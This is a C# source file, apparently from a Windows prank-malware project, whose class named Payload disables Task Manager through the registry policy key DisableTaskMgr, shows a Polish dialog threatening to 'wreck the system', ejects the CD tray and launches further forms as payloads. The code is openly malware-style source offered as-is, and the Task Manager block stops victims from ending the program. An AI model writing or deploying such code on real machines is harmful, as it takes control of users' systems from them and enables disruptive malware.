using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;

namespace RemakeWat
{
    public class Payload
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lprstReturnString, int uReturnLenght, int hwndCallback);


        public void blok()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableTaskMgr", 1);
                key.Close();



        }
        public void DVD()
        {
            DialogResult dialog = MessageBox.Show("Chcesz trochę MEMÓW?", "ROZWALĘ SYSTEM", MessageBoxButtons.YesNo);
            if(dialog == DialogResult.Yes)
            {
                int result = mciSendString("set cdaudio door open", null, 0, 0);
                Thread.Sleep(100);
                result = mciSendString("set cdaudio door close", null, 0, 0);


            }




        }


        public void Payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());


            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();




        }
        public void payload2() {

            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());


            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

        }



    }
}
